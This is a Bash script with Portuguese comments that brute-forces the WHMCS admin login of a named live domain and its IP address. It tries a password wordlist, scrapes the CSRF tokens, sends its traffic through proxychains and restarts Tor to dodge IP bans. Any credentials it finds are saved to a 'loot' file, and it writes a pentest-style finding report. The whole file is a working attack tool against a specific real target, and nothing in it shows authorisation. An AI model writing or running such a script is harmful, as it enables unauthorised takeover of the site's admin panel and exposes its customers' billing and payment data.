#!/bin/bash
# WHMCS Admin Brute Force via curl + IP direto
# Alvo: 8kiptv.co / IP: 68.65.122.227

TARGET="https://68.65.122.227/clients/admin/login.php"
LOGIN_URL="https://68.65.122.227/clients/admin/dologin.php"
HOST="8kiptv.co"
COOKIE_JAR="/tmp/whmcs_brute_cookies.txt"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
DELAY=5  # segundos entre tentativas
MAX_RETRIES=3

# Usuários conhecidos
USERS=("admin" "admin1" "Administrator" "root")

# Wordlist de senhas comuns para WHMCS/cPanel
PASSWORDS=(
    "admin" "password" "admin123" "123456" "whmcs" "admin2024"
    "admin2025" "admin2026" "Password1" "P@ssw0rd" "passwd"
    "test" "demo" "root" "toor" "manager" "administrator"
    "letmein" "welcome" "qwerty" "12345678" "123456789"
    "admin1" "server" "hosting" "8kiptv" "kiptv" "iptv"
    "stream" "tv2024" "tv2025" "tv2026" "support" "info"
    "servpcxr" "Master" "master" "changeme" "secret" "pass"
    "temp123" "user" "username" "login" "secure" "s3cur3"
    "whmcsadmin" "whmcs2024" "webhost" "hosting123" "server123"
    "admin!" "password!" "admin1234" "senha" "1234"
    "flamengo" "corinthians" "brasil" "Palmeiras" "Santos"
)

total=$(( ${#USERS[@]} * ${#PASSWORDS[@]} ))
count=0

echo "=== WHMCS Admin Brute Force ==="
echo "Target: $TARGET"
echo "Users: ${#USERS[@]}, Passwords: ${#PASSWORDS[@]}, Total: $total"
echo "Delay: ${DELAY}s"
echo "================================="

for user in "${USERS[@]}"; do
    for pass in "${PASSWORDS[@]}"; do
        count=$((count + 1))
        echo -n "[$count/$total] Tentando ${user}:${pass}... "
        
        # Limpar cookies e obter nova página com CSRF token
        rm -f "$COOKIE_JAR"
        
        # Obter página de login e extrair CSRF token
        page=$(proxychains4 -q curl -sk -c "$COOKIE_JAR" \
            -H "Host: $HOST" \
            -A "$UA" \
            --connect-timeout 10 --max-time 20 \
            "$TARGET" 2>/dev/null)
        
        csrf=$(echo "$page" | grep -oP 'name="token"\s+value="([a-f0-9]+)"' | head -1 | grep -oP '[a-f0-9]{40}')
        
        if [ -z "$csrf" ]; then
            echo "FAIL (no CSRF)"
            sleep $DELAY
            continue
        fi
        
        # Tentar login
        result=$(proxychains4 -q curl -sk -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
            -H "Host: $HOST" \
            -A "$UA" \
            -d "token=${csrf}&username=${user}&password=${pass}&rememberme=1" \
            --connect-timeout 10 --max-time 20 \
            -L \
            "$LOGIN_URL" 2>/dev/null)
        
        # Verificar resultado
        if echo "$result" | grep -qi "logout\|dashboard\|admin index\|configuration\|clients" && \
           ! echo "$result" | grep -qi "invalid\|login failed\|incorrect"; then
            echo "*** SUCESSO! ***"
            echo ""
            echo "========================================="
            echo "CREDENCIAIS ENCONTRADAS!"
            echo "User: $user"
            echo "Pass: $pass"
            echo "URL: https://8kiptv.co/clients/admin/"
            echo "========================================="
            
            # Salvar evidência
            mkdir -p /home/ubuntu/8kiptv.co/loot
            echo "WHMCS Admin: $user:$pass" > /home/ubuntu/8kiptv.co/loot/creds.txt
            echo "URL: https://8kiptv.co/clients/admin/" >> /home/ubuntu/8kiptv.co/loot/creds.txt
            
            cat > /home/ubuntu/8kiptv.co/evidence/F-026-whmcs-admin-creds.txt << EOF
# F-026 WHMCS Admin Credentials Found
Alvo: 8kiptv.co (68.65.122.227)
Severidade: CRÍTICA
Timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)

## Credenciais
Usuário: ${user}
Senha: ${pass}

## Acesso
URL: https://8kiptv.co/clients/admin/
Via IP: https://68.65.122.227/clients/admin/login.php

## Impacto
Acesso administrativo total ao WHMCS - clientes, faturas, tickets, configurações do sistema, módulos de pagamento.

## Recomendação
Alterar senha imediatamente, habilitar 2FA, configurar reCAPTCHA, restringir acesso admin por IP.
EOF
            exit 0
        elif echo "$result" | grep -qi "banned"; then
            echo "BANNED (IP bloqueado, tentando renovar Tor...)"
            sudo systemctl restart tor 2>/dev/null
            sleep 10
            continue
        elif echo "$result" | grep -qi "invalid\|login failed\|incorrect"; then
            echo "FAIL (credenciais inválidas)"
        else
            echo "FAIL (resposta desconhecida: $(echo $result | head -c 100))"
        fi
        
        sleep $DELAY
    done
    echo "[*] Usuário $user esgotado."
done

echo ""
echo "[-] Brute force concluído. Nenhuma senha encontrada."